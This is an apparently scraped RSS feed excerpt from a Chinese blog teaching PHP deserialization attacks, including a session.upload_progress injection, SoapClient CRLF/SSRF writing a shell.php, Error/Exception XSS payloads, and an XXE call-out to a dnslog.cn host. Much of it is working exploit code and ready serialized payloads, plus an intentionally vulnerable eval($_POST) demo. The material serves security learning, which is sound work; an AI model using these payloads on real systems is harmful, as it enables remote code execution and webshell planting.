&lt;p&gt;当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，索引是 &lt;code&gt;session.upload_progress.prefix&lt;/code&gt; 与 &lt;code&gt;session.upload_progress.name&lt;/code&gt; 连接在一起的值，所以可通过 session.upload_progress 来设置 session。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此，利用如下：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构造exp&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;OowoO&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$mdzz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mdzz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;phpinfo();&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mdzz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;OowoO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mdzz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;whoami&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;构造上传表单&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;       
    &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;123&amp;quot; /&amp;gt;        
    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;        
    &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;拦截上传请求，修改PHP_SESSION_UPLOAD_PROGRESS的值为exp:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 267; 
			flex-basis: 642px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-3/image-20220221165021990.png&#34; data-size=&#34;854x319&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-3/image-20220221165021990.png&#34;
			width=&#34;854&#34;
			height=&#34;319&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-3/image-20220221165021990_hu1742ebe7ce61e2bbc9d369c41ffca6f9_51670_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-3/image-20220221165021990_hu1742ebe7ce61e2bbc9d369c41ffca6f9_51670_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PHP 反序列化-4</title>
        <link>https://coollllllll.github.io/p/php-4/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-4/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PHP 反序列化-4" /&gt;&lt;h1 id=&#34;php反序列化-4&#34;&gt;PHP反序列化-4&lt;/h1&gt;
&lt;p&gt;常用原生类的利用&lt;/p&gt;
&lt;p&gt;获取含魔术方法的内置类：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
$classes = get_declared_classes();  // 返回由已定义类的名字所组成的数组
foreach ($classes as $class) {
    $methods = get_class_methods($class);  // 返回由类的方法名组成的数组
    foreach ($methods as $method) {
        if (in_array($method, array(
            &#39;__destruct&#39;,
            &#39;__toString&#39;,
            &#39;__wakeup&#39;,
            &#39;__call&#39;,
            &#39;__callStatic&#39;,
            &#39;__get&#39;,
            &#39;__set&#39;,
            &#39;__isset&#39;,
            &#39;__unset&#39;,
            &#39;__invoke&#39;,
            &#39;__set_state&#39;
        ))) {
            print $class . &#39;::&#39; . $method . &amp;quot;;&amp;quot;;
        }
    }
    print &amp;quot;\n&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;soapclient--clrf-ssrf&#34;&gt;SoapClient + CLRF +SSRF&lt;/h2&gt;
&lt;h3 id=&#34;影响范围&#34;&gt;影响范围&lt;/h3&gt;
&lt;p&gt;php 5，7，8&lt;/p&gt;
&lt;h3 id=&#34;简介&#34;&gt;简介&lt;/h3&gt;
&lt;p&gt;SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。&lt;/p&gt;
&lt;p&gt;其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。&lt;/p&gt;
&lt;p&gt;SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。&lt;/p&gt;
&lt;p&gt;如果想要使用SoapClient类需要在php.ini配置文件里面开启相应的扩展。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SoapClient::__construct ( string|null $wsdl , array $options = [] )&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一个参数为WSDL 文件的 URI ，如果是NULL 意味着不使用 WSDL 模式。&lt;/p&gt;
&lt;p&gt;第二个参数是一个数组，如果在WSDL 模式下，这个参数是可选的。如果在non-WSDL 模式下，必须设置location 和 uri 参数，location是要请求的 URL，uri是要访问的资源。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SoapClient::__call ( string $name , array $args ) : mixed&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该魔术方法可触发网络请求。&lt;/p&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;官方说明中表示，其所触发请求的user-agent头是可以由&lt;code&gt;user_agent&lt;/code&gt;参数控制的，而且明显Content-Type 和 Content-Length 都在User-Agent 位置之下，所以我们可以通过user_agent参数构造我们自己的UA头去实现构造任意的POST请求。&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;exp:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1/demo.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$post_string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1=file_put_contents(&amp;#34;shell.php&amp;#34;, &amp;#34;&amp;lt;?php phpinfo();?&amp;gt;&amp;#34;);&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
   &lt;span class=&#34;s1&#34;&gt;&amp;#39;X-Forwarded-For:127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
   &lt;span class=&#34;s1&#34;&gt;&amp;#39;Cookie:admin=1&amp;#39;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SoapClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;location&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_agent&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wupco^^Content-Type:application/x-www-form-urlencoded^^&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;^^&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;^^Content-Length:&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$post_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;^^^^&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$post_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uri&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;haha&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;^^&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%0d%0a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%26&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//调用__call方法触发网络请求发送
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;no_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;errorexception--xss&#34;&gt;Error/Exception + XSS&lt;/h2&gt;
&lt;h3 id=&#34;影响范围-1&#34;&gt;影响范围&lt;/h3&gt;
&lt;p&gt;Error(php7, PHP8),&lt;/p&gt;
&lt;p&gt;Exception(php5, php7, PHP8)&lt;/p&gt;
&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;Error类就是php的一个内置类用于自动自定义一个&lt;code&gt;Error&lt;/code&gt;，在php环境下可能会造成&lt;code&gt;xss&lt;/code&gt;漏洞，因为它内置有一个&lt;code&gt;toString&lt;/code&gt;的方法。&lt;/p&gt;
&lt;h3 id=&#34;示例-1&#34;&gt;示例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Error exp：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Error payload:&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Exception exp:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
　　&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
　　&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Exception payload:&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;simplexmlelement--xxe&#34;&gt;SimpleXMLElement + XXE&lt;/h2&gt;
&lt;h3 id=&#34;影响范围-2&#34;&gt;影响范围&lt;/h3&gt;
&lt;p&gt;php 5，7，8&lt;/p&gt;
&lt;h3 id=&#34;原理-2&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;实例化该类的对象传入xml代码进行xxe攻击，进而读取文件内容和命令执行。&lt;/p&gt;
&lt;h3 id=&#34;示例-2&#34;&gt;示例&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;exp：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
$xml = &amp;lt;&amp;lt;&amp;lt;EOF
&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot; ?&amp;gt;
&amp;lt;!DOCTYPE ANY [
    &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://86vtbx.dnslog.cn&amp;quot;&amp;gt;%remote;]&amp;gt;
]&amp;gt;
&amp;lt;x&amp;gt;&amp;amp;xee&amp;lt;/x&amp;gt;
EOF;
$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);
var_dump($xml_class);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 300; 
			flex-basis: 722px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-4/image-20220221175556823.png&#34; data-size=&#34;343x114&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-4/image-20220221175556823.png&#34;
			width=&#34;343&#34;
			height=&#34;114&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-4/image-20220221175556823_hu592dfc259f53fb93c1e82f56b94b6ccd_4811_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-4/image-20220221175556823_hu592dfc259f53fb93c1e82f56b94b6ccd_4811_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PHP 反序列化基础</title>
        <link>https://coollllllll.github.io/p/php-1/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PHP 反序列化基础" /&gt;&lt;p&gt;反序列化漏洞还是非常有意思，值得学习，实践效果也非常不错，所以系统学习一下。&lt;/p&gt;
&lt;h1 id=&#34;php反序列化基础&#34;&gt;PHP反序列化基础&lt;/h1&gt;
&lt;h2 id=&#34;类与对象&#34;&gt;类与对象&lt;/h2&gt;
&lt;p&gt;PPH中的类和对象&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
class Person {
	public $name = &amp;quot;cool&amp;quot;;
	public function haha() {
		echo $this-&amp;gt;name.&amp;quot;:hello!\n&amp;quot;;
	}
}
$person1 = new Person();
$person1-&amp;gt;haha();
?&amp;gt;
